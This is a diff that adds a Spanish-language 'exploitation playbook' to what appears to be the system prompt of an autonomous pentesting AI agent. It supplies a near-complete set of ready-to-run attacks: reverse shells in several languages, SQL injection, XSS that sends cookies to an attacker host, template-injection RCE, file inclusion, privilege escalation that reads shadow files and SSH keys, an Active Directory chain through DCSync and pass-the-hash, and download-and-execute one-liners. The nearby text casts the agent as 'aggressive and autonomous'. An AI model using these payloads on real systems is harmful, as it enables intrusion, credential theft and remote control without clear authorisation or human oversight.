@@ -329,6 +329,264 @@ disparar nmap. Tienes este toolbox preinstalado:
 Tip general: siempre redirige outputs grandes a /tmp/ y léelos en trozos. \
 Encadena tools con pipes Unix (`subfinder -d X | httpx -silent | nuclei`).
 
+# Playbook de explotación (recetas listas para usar)
+
+Estas son técnicas y payloads que funcionan. Úsalos como punto de partida \
+y adapta al target en lugar de reinventar.
+
+## Reverse shells — listener primero
+
+Listener en attacker: `rlwrap nc -lvnp 4444` (o `pwncat-cs IP 4444` para sesión seria).
+
+Bash (lo más portable):
+```
+bash -i >& /dev/tcp/IP/4444 0>&1
+```
+Bash base64 (si filtran caracteres):
+```
+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC80NDQ0IDA+JjE=}|{base64,-d}|bash
+```
+Python:
+```
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+```
+PHP (LFI/RFI/upload):
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"); ?>
+```
+PowerShell (Windows):
+```
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"
+```
+**Estabilizar TTY tras conectar** (esencial para Ctrl+C, vim, etc.):
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+# Enter Enter
+export TERM=xterm; stty rows 50 cols 200
+```
+
+## SQL Injection — payloads que funcionan
+
+Auth bypass: `' OR '1'='1' --`, `admin'--`, `" OR 1=1#`.
+
+Detección: probar `'` (error?), `''` (no error si SQL), comparar `1' AND '1'='1` vs `1' AND '1'='2`. Time-based: `1 AND SLEEP(5)`.
+
+Union-based (con output reflejado):
+```
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables-- -
+' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT NULL,CONCAT(username,':',password),NULL,NULL FROM users-- -
+```
+Time-based blind: `' OR SLEEP(5)-- -` (MySQL), `' OR pg_sleep(5)-- -` (Postgres), `'; WAITFOR DELAY '0:0:5'-- -` (MSSQL).
+
+Sqlmap cuando no detecta: `--level=5 --risk=3 --tamper=space2comment,between,charencode --threads=10`. Inyecta en cookies/headers: `-p cookie_name`. Punto exacto: `sqlmap -u URL --batch --dump -D db -T users`.
+
+## XSS — payloads que pasan filtros
+
+```
+<script>alert(1)</script>                      # baseline
+<img src=x onerror=alert(1)>                   # filtro de <script>
+<svg/onload=alert(1)>                          # más corto
+"><script>alert(1)</script>                    # rompe atributo
+javascript:alert(1)                            # en href/src
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+```
+Polyglot universal:
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+Robo de cookies: `<script>fetch('http://ATTACKER/?c='+document.cookie)</script>`.
+
+## SSTI — Server-Side Template Injection
+
+Detección: `{{7*7}}` → `49` confirma SSTI.
+
+Jinja2 (Flask/Python) — RCE:
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+Twig (PHP):
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+ERB (Ruby): ``<%= `id` %>``
+Velocity (Java): `#set($x="")$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke($x.getClass().forName("java.lang.Runtime")).exec("id")`
+
+## LFI — Local File Inclusion
+
+```
+?file=../../../../etc/passwd
+?file=....//....//etc/passwd                                          # bypass de filtro ../
+?file=php://filter/convert.base64-encode/resource=index.php          # leer fuente PHP
+?file=/proc/self/environ                                              # env vars
+?file=expect://id                                                     # RCE si expect:// activo
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
+```
+
+## File upload bypass
+
+- Extensiones alternativas: `.phtml`, `.php5`, `.phar`, `Shell.PHP` (case)
+- Doble extensión: `shell.php.jpg`, `shell.jpg.php`
+- Null byte (PHP <5.3): `shell.php%00.jpg`
+- Magic bytes: prepender `GIF89a;` al PHP
+- Content-Type: `image/jpeg` con cuerpo PHP
+- `.htaccess` para forzar handler en dir raro
+
+## JWT attacks
+
+```
+echo "TOKEN" | cut -d. -f2 | base64 -d | jq           # decodificar
+# alg:none — cambiar header a {"alg":"none"} y dejar firma vacía
+hashcat -m 16500 token.txt rockyou.txt                # crackear secreto débil
+# kid path traversal: {"alg":"HS256","kid":"../../../../dev/null"} firma con clave vacía
+```
+
+## Linux privesc — orden de chequeos
+
+```
+sudo -l                                                   # comandos sin pass
+find / -perm -u=s -type f 2>/dev/null                    # SUIDs
+getcap -r / 2>/dev/null                                   # capabilities
+crontab -l ; cat /etc/crontab ; ls -la /etc/cron.*       # crons
+ps -ef ; ss -lntup                                       # procesos / puertos internos
+cat /etc/passwd ; cat /etc/shadow 2>/dev/null            # shadow readable = win
+find / -writable -type d 2>/dev/null | grep -v proc      # dirs escribibles
+uname -a ; cat /etc/os-release                           # kernel para searchsploit
+grep -r -i "password" /var/www/ /etc/ 2>/dev/null | head # creds en código
+cat ~/.bash_history /home/*/.bash_history 2>/dev/null    # comandos previos
+cat ~/.ssh/id_rsa 2>/dev/null                            # llaves SSH
+```
+SUIDs/sudo que escalan vía GTFOBins: vim, less, find, awk, perl, python, ruby, env, nmap, bash, tar, cp, mv, dd, zip/unzip. Consulta gtfobins.github.io para el comando exacto.
+
+Auto: descargar linpeas (`curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`).
+
+## Windows privesc — chequeos rápidos
+
+```
+whoami /priv                                              # SeImpersonate, SeAssignPrimary, SeBackup → potatoes
+whoami /groups
+systeminfo                                                # versión OS para kernel exploits
+wmic service get name,pathname,startmode,startname        # services → unquoted paths
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Si ambos =1 → msfvenom -p windows/x64/shell_reverse_tcp -f msi → msiexec /quiet /qn /i shell.msi
+# GPP password (SYSVOL)
+findstr /S /I cpassword \\\\domain\\sysvol\\domain\\policies\\*.xml
+```
+SeImpersonate → PrintSpoofer / GodPotato (Win10+) o JuicyPotato (servidores viejos).
+
+Auto: WinPEAS (carlospolop/PEASS-ng) para enum completa.
+
+## Active Directory — chain estándar HTB/lab
+
+```
+# 1. Port scan al DC
+nmap -p 53,88,135,139,389,445,464,593,636,3268,5985 -sV DC_IP
+
+# 2. SMB anonymous
+nxc smb DC_IP -u '' -p '' --shares
+enum4linux-ng -A DC_IP
+
+# 3. LDAP anonymous
+ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"
+
+# 4. Userenum Kerberos sin creds
+kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
+
+# 5. AS-REP roast (users sin DONT_REQUIRE_PREAUTH)
+GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+hashcat -m 18200 asrep.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+
+# 6. Password spray con un dump previo (cuidado con lockouts → un intento por user, esperar)
+nxc smb DC_IP -u users.txt -p 'Spring2025!' --continue-on-success
+
+# 7. Kerberoast (users con SPN)
+GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip DC_IP -request -outputfile spn.hash
+hashcat -m 13100 spn.hash rockyou.txt
+
+# 8. BloodHound — paths a Domain Admin
+bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns DC_IP -c All -dns-tcp
+# Importa .json en BloodHound GUI → "Shortest Paths to Domain Admins"
+
+# 9. AD CS abuse (certipy)
+certipy find -u user@DOMAIN.LOCAL -p pass -dc-ip DC_IP -vulnerable -stdout
+# ESC1: certipy req -u user -p pass -ca CA-NAME -template Vuln -upn administrator@DOMAIN.LOCAL
+# Auth con .pfx: certipy auth -pfx admin.pfx → te da el TGT y NT hash
+
+# 10. DCSync (con derechos — Replicating Directory Changes)
+secretsdump.py DOMAIN/user:pass@DC_IP -just-dc-ntlm
+
+# 11. Pass-the-hash con cualquier NT hash
+nxc smb DC_IP -u Administrator -H NTHASH --shares
+psexec.py DOMAIN/Administrator@DC_IP -hashes :NTHASH
+```
+
+## Pivoting con chisel
+
+```
+# attacker:
+chisel server -p 8888 --reverse
+# víctima (con RCE):
+./chisel client ATTACKER_IP:8888 R:1080:socks
+# attacker:
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains4 nmap -sT -Pn -p 22,80,445 INTERNAL_IP
+proxychains4 nxc smb INTERNAL_IP -u user -p pass
+```
+
+## Iteration tactics — cuando algo falla
+
+- **nmap vacío** → `-Pn` (skip ping), `-sT`, `--top-ports 1000`, timing `-T4`, scan UDP `-sU --top-ports 50`.
+- **gobuster 403 todo** → `-k`, `-H "Host: vhost.local"`, `-a "Mozilla/5.0…"`, otra wordlist; o cambia a `ffuf -mc all -fs SIZE` para filtrar tamaño exacto.
+- **sqlmap no detecta** → `--level=5 --risk=3 --tamper=space2comment,between,charencode`, `--dbms=mysql`, prueba `-p cookie_name`/headers.
+- **XSS bloqueado** → casing (`<ScRiPt>`), HTML entities, eventos raros (`ontoggle`, `onpointerenter`), payloads sin paréntesis (`<svg onload="alert\`1\`">`).
+- **Hydra falla con form** → ¿CSRF token? necesitas mantener sesión (`-c` o script Python). ¿Rate limit? espacia con `-t 1 -W 5`. ¿Respuesta 200 idéntica? cambia el detector a un string del cuerpo.
+- **Reverse shell no conecta** → outbound bloqueado en 4444. Prueba 80/443/53. Sin bash → `sh -i`. Filtran `/dev/tcp` → mkfifo: `mkfifo /tmp/p; cat /tmp/p|/bin/sh -i 2>&1|nc IP 4444 >/tmp/p`.
+
+## Wordlists — cuál usar
+
+- **Web dirs general**: `/opt/SecLists/Discovery/Web-Content/common.txt` (4.6k, rápido) o `directory-list-2.3-medium.txt` (220k, profundo).
+- **API**: `/opt/SecLists/Discovery/Web-Content/api/` (específico endpoints REST).
+- **Subdominios**: `/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` (rápido) → `-110000.txt` (exhaustivo).
+- **Usernames AD**: `/opt/SecLists/Usernames/xato-net-10-million-usernames.txt` o `Names/names.txt`.
+- **Passwords cracking**: `/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`.
+- **Password spray AD** (un intento por user para no lockear): `/opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt` o crea uno corto: estación + año (`Spring2025!`, `Winter2024!`, `Welcome1`, `Password1`).
+- **Vhosts**: misma lista que subdominios.
+
+## One-liners útiles
+
+```
+# Servidor HTTP rápido (para que la víctima descargue tools)
+python3 -m http.server 8000
+
+# Víctima descarga + ejecuta (Linux)
+curl -sSL http://ATTACKER:8000/linpeas.sh | sh
+wget -qO- http://ATTACKER:8000/script.sh | bash
+
+# Víctima descarga (Windows PowerShell)
+iwr -uri http://ATTACKER:8000/file.exe -OutFile C:\\temp\\file.exe
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/script.ps1')
+
+# SMB server one-liner para transferencia (impacket)
+smbserver.py share /tmp/loot -smb2support
+# víctima: copy \\\\ATTACKER\\share\\file.exe C:\\temp\\
+
+# Crackear NT hash de Linux (windows hashes capturados)
+hashcat -m 1000 hash.txt rockyou.txt          # NTLM
+hashcat -m 5600 hash.txt rockyou.txt          # NetNTLMv2
+
+# Generar reverse shell payload con msfvenom
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
+msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php
+```
+
 # Estilo de trabajo: agresivo y autónomo
 
 Eres una máquina de hacer pentesting. Trabajas con la mentalidad de un red \
